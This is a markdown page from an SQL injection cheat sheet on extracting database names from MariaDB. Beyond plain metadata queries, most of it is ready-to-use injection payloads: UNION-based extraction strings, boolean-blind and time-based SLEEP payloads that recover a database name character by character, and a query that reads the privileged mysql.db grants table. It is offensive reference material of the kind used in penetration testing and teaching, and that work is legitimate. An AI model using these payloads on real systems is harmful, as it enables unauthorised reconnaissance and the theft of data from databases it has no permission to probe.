---
title: Database Names
description: How to extract database names from MariaDB
category: Information Gathering
order: 6
tags: ["schema", "database names"]
lastUpdated: 2025-12-18
---

## Database Names

Extracting database names is often a crucial step in SQL injection attacks, as it helps identify potential targets for further exploitation.

| Information | Query                                     |
| ----------- | ----------------------------------------- |
| Tables      | `information_schema.SCHEMATA`, `mysql.db` |
| Columns     | `SCHEMA_NAME`, `db`                       |
| Current DB  | `DATABASE()`, `SCHEMA()`                  |

## Current Database

```sql
-- Get current database name
SELECT DATABASE()

-- SCHEMA() is an alias for DATABASE()
SELECT SCHEMA()

-- Both return the same value
SELECT DATABASE() AS db1, SCHEMA() AS db2
-- db1 and db2 will be identical
```

## List All Databases

### Via information_schema.SCHEMATA

```sql
-- List all database names
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA

-- Filter specific database
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA WHERE SCHEMA_NAME = 'vulndb'

-- Count total databases
SELECT COUNT(*) FROM information_schema.SCHEMATA
```

### Via mysql.db (Requires Privileges)

```sql
-- List databases with explicit grants (requires elevated privileges)
SELECT DISTINCT(db) FROM mysql.db

-- Get database and user info
SELECT db, user FROM mysql.db LIMIT 5
```

**Note:** The `mysql.db` table may be empty if no per-database grants exist.

### Via SHOW Commands

```sql
-- SHOW DATABASES command
SHOW DATABASES

-- SHOW SCHEMAS (alias for SHOW DATABASES)
SHOW SCHEMAS

-- Filter with LIKE pattern
SHOW DATABASES LIKE 'vuln%'
```

## Database Metadata

The `information_schema.SCHEMATA` table contains additional metadata:

```sql
-- Get database with character set
SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME
FROM information_schema.SCHEMATA
WHERE SCHEMA_NAME = 'vulndb'

-- Get database with collation
SELECT SCHEMA_NAME, DEFAULT_COLLATION_NAME
FROM information_schema.SCHEMATA
WHERE SCHEMA_NAME = 'vulndb'

-- Get all columns for a database
SELECT * FROM information_schema.SCHEMATA WHERE SCHEMA_NAME = 'vulndb'
```

## Aggregating Database Names

Use `GROUP_CONCAT` to get all database names in a single result:

```sql
-- Get all database names comma-separated
SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA

-- Custom separator
SELECT GROUP_CONCAT(SCHEMA_NAME SEPARATOR '|') FROM information_schema.SCHEMATA

-- Ordered alphabetically
SELECT GROUP_CONCAT(SCHEMA_NAME ORDER BY SCHEMA_NAME) FROM information_schema.SCHEMATA
```

## UNION-Based Extraction

Extract database names through UNION injection:

```sql
-- Extract all database names
' UNION SELECT 1, SCHEMA_NAME FROM information_schema.SCHEMATA -- -

-- Extract current database
' UNION SELECT 1, DATABASE() -- -

-- Extract aggregated database names in one row
' UNION SELECT 1, GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA -- -

-- Extract from mysql.db if privileged
' UNION SELECT 1, IFNULL(GROUP_CONCAT(DISTINCT db), 'none') FROM mysql.db -- -
```

### Full Query Examples

```sql
-- UNION SELECT database names
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, SCHEMA_NAME FROM information_schema.SCHEMATA

-- UNION SELECT current database
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, DATABASE()

-- UNION SELECT aggregated names
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA
```

## Boolean-Based Extraction

Extract database name character-by-character in blind injection scenarios:

```sql
-- Check first character of database name
SELECT IF(SUBSTRING(DATABASE(),1,1)='v', 1, 0) AS result

-- Check database name length
SELECT IF(LENGTH(DATABASE())=6, 1, 0) AS result

-- Check specific character with ASCII code
SELECT IF(ASCII(SUBSTRING(DATABASE(),1,1))=118, 1, 0) AS result
-- 118 is ASCII code for 'v'

-- Check if specific database exists
SELECT IF(
  (SELECT COUNT(*) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME='vulndb') > 0,
  1, 0
) AS result
```

### In Blind Injection Context

```sql
-- Check if first char is 'v'
' AND SUBSTRING(DATABASE(),1,1)='v' -- -

-- Check if database name length is 6
' AND LENGTH(DATABASE())=6 -- -

-- Check ASCII value of first character
' AND ASCII(SUBSTRING(DATABASE(),1,1))=118 -- -
```

## Using LIMIT and OFFSET

Enumerate databases one at a time:

```sql
-- Get first database
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 0

-- Get second database
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 1

-- Get third database
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 2
```

### In UNION Injection

```sql
-- Extract databases one at a time
' UNION SELECT 1, SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 0 -- -
' UNION SELECT 1, SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 1 -- -

-- Control total number of results
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 3
```

## Time-Based Extraction

Extract database name using time delays:

```sql
-- Delay if first character is 'v'
' AND IF(SUBSTRING(DATABASE(),1,1)='v', SLEEP(5), 0) -- -

-- Delay if database name length is 6
' AND IF(LENGTH(DATABASE())=6, SLEEP(5), 0) -- -

-- Delay if ASCII value matches
' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=118, SLEEP(5), 0) -- -
```

## Filtering System Databases

Exclude MariaDB system databases when enumerating:

```sql
-- Exclude system databases
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA
WHERE SCHEMA_NAME NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')

-- In UNION injection
' UNION SELECT 1, SCHEMA_NAME FROM information_schema.SCHEMATA
WHERE SCHEMA_NAME NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') -- -
```
